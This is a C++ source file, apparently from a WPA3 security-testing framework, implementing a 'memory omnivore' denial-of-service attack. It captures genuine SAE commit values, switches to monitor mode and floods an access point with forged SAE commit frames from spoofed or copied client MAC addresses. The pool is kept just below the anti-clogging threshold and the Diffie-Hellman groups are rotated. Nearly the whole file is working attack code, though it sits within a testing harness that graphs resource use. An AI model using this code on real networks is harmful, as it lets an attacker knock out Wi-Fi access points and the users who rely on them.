#include "attacks/DoS_hard/memory_omnivore/memory_omnivore.h"

#include <tins/tins.h>
#include <thread>
#include <chrono>
#include <random>
#include <stdexcept>
#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "attacks/DoS_hard/dos_helpers.h"
#include "config/RunStatus.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::memory_omnivore{
static constexpr uint16_t DH_GROUPS[] = {19, 20, 21};
static constexpr size_t N_DH_GROUPS = std::size(DH_GROUPS);

// TODO make alternative external
vector<HWAddress<6>> get_connected_stas(RunStatus &rs){
    const ActorPtr ap = rs.get_actor("access_point");
    vector<HWAddress<6>> result;

    const string out =
            ap->conn->exec("iw dev $(iw dev | awk '/Interface/{print $2}' | head -1) station dump 2>/dev/null");

    istringstream ss(out);
    string line;
    while(getline(ss, line)){
        if(line.rfind("Station", 0) != 0) continue;
        istringstream ls(line);
        string token, mac_str;
        ls >> token >> mac_str; // "Station" "<mac>"
        try{
            result.emplace_back(mac_str);
        } catch(...){}
    }
    log(LogLevel::INFO, " Found {} connected STAs", result.size());
    return result;
}

static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size,
                                           const bool use_connected_stas
){
    vector<HWAddress<6>> pool;
    if(use_connected_stas){
        pool = get_connected_stas(rs);
        pool.resize(min(static_cast<int>(pool.size()), pool_size));

        if(static_cast<int>(pool.size()) < pool_size){
            log(LogLevel::WARNING, "Only {} connected STAs available (need {}), padding with random MACs",
                pool.size(), pool_size);
            while(static_cast<int>(pool.size()) < pool_size) pool.emplace_back(hw_capabilities::rand_mac());
        } else{
            log(LogLevel::INFO, "Using {} connected STA MACs", pool_size);
        }
        return pool;
    }

    pool.reserve(pool_size);
    for(int i = 0; i < pool_size; ++i) pool.emplace_back(hw_capabilities::rand_mac());
    log(LogLevel::INFO, "Using {} random MACs", pool_size);
    return pool;
}

void run_attack(RunStatus &rs){
    const ActorPtr attacker = rs.get_actor("attacker");
    const ActorPtr ap = rs.get_actor("access_point");

    const auto ssid = rs.config.at("actors").at("access_point")
                        .at("setup").at("program_config").at("ssid").get<string>();

    // Capture real scalar+element via wpa_supplicant before switching to monitor
    log(LogLevel::INFO, "Capturing SAE commit values...");
    const optional<dos_helpers::SAEPair> sae_params = cookie_guzzler::get_commit_values(
        rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);

    if(!sae_params.has_value()) throw runtime_error("Failed to capture SAE commit values");

    attacker->set_monitor_mode();
    attacker->set_iface_up();

    log(LogLevel::INFO, "Setup done, group_id=%u, scalar size={}",
        sae_params->group_id, sae_params->scalar.size());

    const HWAddress<6> ap_mac(ap["mac"]);
    const string iface = attacker["iface"];

    const auto &att_cfg = rs.config.at("attack_config");
    const int attack_time = att_cfg.at("attack_time_sec").get<int>();
    const int burst_size = att_cfg.at("burst_size").get<int>();
    const int acm_threshold = att_cfg.at("acm_threshold").get<int>();
    const bool random_dh = att_cfg.at("random_dh_groups").get<bool>();
    const bool use_conn_stas = att_cfg.at("use_connected_stas").get<bool>();

    // Pool size must stay strictly below ACM threshold
    const int pool_size = max(1, acm_threshold - 1);

    const vector<HWAddress<6>> mac_pool = build_mac_pool(rs, pool_size, use_conn_stas);

    PacketSender sender(iface);
    mt19937 rng(random_device{}());
    uniform_int_distribution<size_t> group_dist(0, N_DH_GROUPS - 1);

    rs.start_observers();
    log(LogLevel::INFO, "Attack started");

    long long total_sent = 0;
    long long next_log = 0;
    const auto end_time = steady_clock::now() + seconds(attack_time);

    while(steady_clock::now() < end_time){
        for(const auto &sta_mac: mac_pool){
            if(steady_clock::now() >= end_time) break;

            sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];

            auto frame = make_sae_commit(ap_mac, sta_mac, sae_params.value());
            for(int i = 0; i < burst_size; ++i){
                sender.send(frame);
                this_thread::sleep_for(nanoseconds(100));
            }
            total_sent += burst_size;
        }

        if(total_sent >= next_log){
            log(LogLevel::DEBUG, "Packets sent: %lld", total_sent);
            next_log += 10000;
        }
    }

    log(LogLevel::INFO, "Done. Total packets sent: %lld", total_sent);
    ap->conn->disconnect();
}

void stats_attack(const RunStatus &rs){
    const auto ap = rs.config.at("actors").at("access_point");
    observer::resource_checker::create_graph(rs, ap["source"]);
}
}